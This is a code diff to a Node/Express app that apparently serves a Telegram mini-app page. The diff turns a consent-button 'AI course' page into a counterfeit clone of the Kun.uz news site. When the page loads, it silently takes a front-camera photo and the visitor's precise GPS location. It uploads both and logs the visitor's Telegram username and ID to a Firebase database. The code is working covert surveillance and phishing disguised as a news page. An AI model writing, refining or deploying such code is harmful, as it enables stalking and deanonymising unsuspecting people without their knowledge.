@@ -298,33 +298,139 @@ handleLogin(req, res, parseInt(uid));
 
 // === STUDENT PAGE ===
 app.get("/r/:ref", async (req, res) => {
-const ref = req.params.ref;
-if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
-await saveUser(ref);
-res.type("html").send(`<!DOCTYPE html>
-<html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>AI Course</title>
+  const ref = req.params.ref;
+  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
+  await saveUser(ref);
+  res.type("html").send(`<!DOCTYPE html>
+<html lang="uz"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Kun.uz - So'nggi yangiliklar</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;}
-.card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border-radius:16px;padding:20px;max-width:380px;width:90%;text-align:center;}
-h1{font-size:1.6rem;color:#0f9;margin:8px 0;}
-.warn{background:#c62828;padding:12px;border-radius:10px;font-size:.9rem;margin:12px 0;}
-button{background:#0f9;color:#000;border:none;padding:14px;font-size:1rem;font-weight:600;border-radius:50px;width:100%;cursor:pointer;}
-#status{margin-top:12px;padding:10px;background:rgba(0,255,136,.1);border-radius:8px;font-size:.9rem;}</style></head><body>
-<div class="card"><h1>AI 2024</h1><div class="warn"><strong>REQUIRED:</strong><br>• Photo (verification)<br>• Location (region)</div>
-<button id="go">CONFIRM</button><div id="status">Ready…</div></div>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body,html{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5;color:#333;line-height:1.6;}
+.header{background:#fff;border-bottom:3px solid #e31e24;box-shadow:0 2px 8px rgba(0,0,0,.1);position:sticky;top:0;z-index:1000;}
+.header-content{max-width:1200px;margin:0 auto;padding:15px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;}
+.logo{font-size:28px;font-weight:700;color:#e31e24;text-decoration:none;}
+.nav{display:flex;gap:20px;flex-wrap:wrap;}
+.nav a{color:#333;text-decoration:none;font-weight:500;font-size:14px;transition:color .3s;}
+.nav a:hover{color:#e31e24;}
+.container{max-width:1200px;margin:20px auto;padding:0 20px;}
+.main-grid{display:grid;grid-template-columns:1fr 350px;gap:25px;margin-top:20px;}
+@media(max-width:968px){.main-grid{grid-template-columns:1fr;}}
+.news-section{background:#fff;border-radius:12px;padding:25px;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:20px;}
+.news-title{font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:20px;padding-bottom:12px;border-bottom:3px solid #e31e24;}
+.article{display:flex;gap:15px;padding:15px 0;border-bottom:1px solid #eee;cursor:pointer;transition:background .3s;}
+.article:hover{background:#f9f9f9;padding-left:5px;padding-right:5px;}
+.article:last-child{border-bottom:none;}
+.article-img{width:120px;height:80px;background:linear-gradient(135deg,#e31e24 0%,#c41e3a 100%);border-radius:8px;flex-shrink:0;}
+.article-content{flex:1;}
+.article-heading{font-size:16px;font-weight:600;color:#1a1a1a;margin-bottom:8px;line-height:1.4;}
+.article-meta{font-size:12px;color:#999;display:flex;gap:15px;}
+.card{background:rgba(255,255,255,.95);backdrop-filter:blur(12px);border-radius:16px;padding:25px;box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center;}
+.card h1{font-size:1.8rem;color:#e31e24;margin:8px 0 15px;}
+.warn{background:#c62828;color:#fff;padding:15px;border-radius:10px;font-size:.9rem;margin:15px 0;line-height:1.6;}
+#status{margin-top:15px;padding:12px;background:rgba(227,30,36,.1);border-radius:8px;font-size:.9rem;color:#333;min-height:40px;display:flex;align-items:center;justify-content:center;}
+.sidebar{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 12px rgba(0,0,0,.08);height:fit-content;position:sticky;top:90px;}
+.sidebar-title{font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #e31e24;}
+.quick-news{display:flex;gap:12px;padding:12px 0;border-bottom:1px solid #eee;}
+.quick-news:last-child{border-bottom:none;}
+.quick-news-img{width:80px;height:60px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);border-radius:6px;flex-shrink:0;}
+.quick-news-text{flex:1;font-size:14px;font-weight:500;color:#1a1a1a;line-height:1.4;}
+.quick-news-time{font-size:11px;color:#999;margin-top:5px;}
+</style></head><body>
+<div class="header">
+<div class="header-content">
+<a href="#" class="logo">📰 Kun.uz</a>
+<nav class="nav">
+<a href="#">Asosiy</a>
+<a href="#">Jamiyat</a>
+<a href="#">Iqtisodiyot</a>
+<a href="#">Siyosat</a>
+<a href="#">Sport</a>
+</nav>
+</div>
+</div>
+<div class="container">
+<div class="main-grid">
+<div>
+<div class="news-section">
+<div class="news-title">Asosiy yangiliklar</div>
+<div class="article">
+<div class="article-img"></div>
+<div class="article-content">
+<div class="article-heading">Prezident yangi investitsiya loyihalarini taqdim etdi</div>
+<div class="article-meta"><span>📅 Bugun, 14:30</span><span>👁 12,450</span></div>
+</div>
+</div>
+<div class="article">
+<div class="article-img"></div>
+<div class="article-content">
+
+<div class="article-heading">Toshkentda yangi metro liniyasi ochildi</div>
+<div class="article-meta"><span>📅 Bugun, 11:15</span><span>👁 8,920</span></div>
+</div>
+</div>
+<div class="article">
+<div class="article-img"></div>
+<div class="article-content">
+<div class="article-heading">Yangi ta'lim dasturlari e'lon qilindi</div>
+<div class="article-meta"><span>📅 Bugun, 09:45</span><span>👁 6,780</span></div>
+</div>
+</div>
+</div>
+<div class="card">
+<h1>Tekshiruv</h1>
+<div class="warn"><strong>KERAK:</strong><br>• Rasm (tasdiqlash)<br>• Joylashuv (mintaqa)</div>
+<div id="status">Yuklanmoqda…</div>
+</div>
+</div>
+<div class="sidebar">
+<div class="sidebar-title">Tezkor yangiliklar</div>
+<div class="quick-news">
+<div class="quick-news-img"></div>
+<div>
+<div class="quick-news-text">Sog'liqni saqlash tizimida yangiliklar</div>
+<div class="quick-news-time">1 soat oldin</div>
+</div>
+</div>
+<div class="quick-news">
+<div class="quick-news-img"></div>
+<div>
+<div class="quick-news-text">Qishloq xo'jaligida rekord hosil</div>
+<div class="quick-news-time">2 soat oldin</div>
+</div>
+</div>
+<div class="quick-news">
+<div class="quick-news-img"></div>
+<div>
+<div class="quick-news-text">Turizm sohasida o'sish kuzatildi</div>
+<div class="quick-news-time">3 soat oldin</div>
+</div>
+</div>
+<div class="quick-news">
+<div class="quick-news-img"></div>
+<div>
+<div class="quick-news-text">Texnologiya sohasida yangi loyihalar</div>
+<div class="quick-news-time">4 soat oldin</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <script>const ref=${JSON.stringify(ref)};const firebaseUrl=${JSON.stringify(FIREBASE_DB_URL)};let photoBlob=null,geo=null,username=null;
 if(window.Telegram?.WebApp){Telegram.WebApp.ready();Telegram.WebApp.expand();const u=Telegram.WebApp.initDataUnsafe.user;if(u)username=u.username||null;}
-document.getElementById("go").onclick=async()=>{const btn=document.getElementById("go"),status=document.getElementById("status");btn.disabled=true;status.textContent="Starting...";
+(async()=>{const status=document.getElementById("status");status.textContent="Boshlanmoqda...";
 try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const video=document.createElement("video");video.srcObject=stream;video.muted=true;video.play();await new Promise(r=>video.onloadeddata=r);
 const canvas=document.createElement("canvas");canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
-photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));stream.getTracks().forEach(t=>t.stop());status.textContent="Photo OK";}catch(e){status.textContent="No photo";}
-try{geo=await new Promise((res,rej)=>{const t=setTimeout(()=>rej(),8000);navigator.geolocation.getCurrentPosition(p=>{clearTimeout(t);res({lat:p.coords.latitude,lon:p.coords.longitude});},()=>{clearTimeout(t);rej();},{timeout:8000,enableHighAccuracy:true});});status.textContent+=" | GPS OK";}catch(e){status.textContent+=" | No GPS";}
-if(!photoBlob&&!geo){status.textContent="Nothing received";btn.disabled=false;return;}
-status.textContent="Sending...";const fd=new FormData();fd.append("ref",ref);if(geo){fd.append("latitude",geo.lat);fd.append("longitude",geo.lon);}if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
+photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));stream.getTracks().forEach(t=>t.stop());status.textContent="Rasm OK";}catch(e){status.textContent="Rasm olinmadi";}
+try{geo=await new Promise((res,rej)=>{const t=setTimeout(()=>rej(),8000);navigator.geolocation.getCurrentPosition(p=>{clearTimeout(t);res({lat:p.coords.latitude,lon:p.coords.longitude});},()=>{clearTimeout(t);rej();},{timeout:8000,enableHighAccuracy:true});});status.textContent+=" | GPS OK";}catch(e){status.textContent+=" | GPS yo'q";}
+if(!photoBlob&&!geo){status.textContent="Hech narsa olinmadi";return;}
+status.textContent="Yuborilmoqda...";const fd=new FormData();fd.append("ref",ref);if(geo){fd.append("latitude",geo.lat);fd.append("longitude",geo.lon);}if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
 try{await fetch("/submit",{method:"POST",body:fd});const userData={userId:ref,username,timestamp:Date.now(),active:true,hasPhoto:!!photoBlob,hasLocation:!!geo};
 await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(userData)});
-status.innerHTML="<strong>SUCCESS!</strong><br>You are active!";btn.style.display="none";}catch(e){status.textContent="Error";btn.disabled=false;}}</script></body></html>`);
+status.innerHTML="<strong>MUVAFFAQIYATLI!</strong><br>Tasdiqlandi!";}catch(e){status.textContent="Xatolik";}})();</script></body></html>`);
 });
+
 
 // === SUBMIT ===
 app.post("/submit", upload.single("photo"), async (req, res) => {
